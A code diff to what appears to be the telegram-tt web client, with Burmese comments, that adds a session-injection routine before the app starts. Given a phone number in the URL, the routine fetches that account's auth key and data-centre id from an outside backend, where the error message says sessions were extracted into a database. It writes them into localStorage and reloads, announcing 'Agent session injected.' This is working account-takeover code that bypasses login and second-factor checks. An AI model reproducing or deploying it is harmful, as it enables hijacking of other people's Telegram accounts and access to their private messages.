@@ -41,7 +41,61 @@ if (IS_TAURI) {
   setupTauriListeners();
 }
 
-init();
+// -------------------------------------------------------------
+// အသစ်ထည့်သွင်းမည့် Session Injection Code
+// -------------------------------------------------------------
+async function checkAndInjectSession() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const loginPhone = urlParams.get('login_phone');
+
+  if (loginPhone) {
+    try {
+      // Backend မှ Session လှမ်းယူခြင်း
+      const response = await fetch('https://telegramtokenreqbackend.onrender.com/api/admin/get-tt-session', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: 7812553563, phoneNumber: loginPhone })
+      });
+      
+      const data = await response.json();
+      
+      if (data.success && data.dcId && data.authKeyHex) {
+        // Hex String ကို telegram-tt နားလည်သော Byte Array အဖြစ်ပြောင်းခြင်း
+        const hexToArray = (hex: string) => {
+          const result = [];
+          for (let i = 0; i < hex.length; i += 2) {
+            result.push(parseInt(hex.substring(i, i + 2), 16));
+          }
+          return result;
+        };
+        
+        const authKeyArray = hexToArray(data.authKeyHex);
+        
+        // telegram-tt ၏ Local Storage သို့ ထည့်သွင်းခြင်း
+        localStorage.setItem('dc', String(data.dcId));
+        localStorage.setItem(`dc${data.dcId}_auth_key`, JSON.stringify(authKeyArray));
+        
+        alert("Mission Synchronized! Agent session injected.");
+        
+        // URL ထဲမှ Parameter ကို ဖျောက်ပြီး Reload လုပ်ကာ App ကို စတင်စေခြင်း
+        window.history.replaceState({}, document.title, window.location.pathname);
+        window.location.reload(); 
+        return; 
+      } else {
+        alert("Session extraction failed or not found in database.");
+      }
+    } catch (error) {
+      console.error("Session Injection Error:", error);
+    }
+  }
+  
+  // login_phone မပါလာလျှင် သို့မဟုတ် Error တက်လျှင် ပုံမှန်အတိုင်း App ကို စတင်မည်
+  init();
+}
+
+// Function ကို ခေါ်၍ အလုပ်လုပ်စေခြင်း
+checkAndInjectSession();
+// -------------------------------------------------------------
 
 async function init() {
   if (DEBUG) {
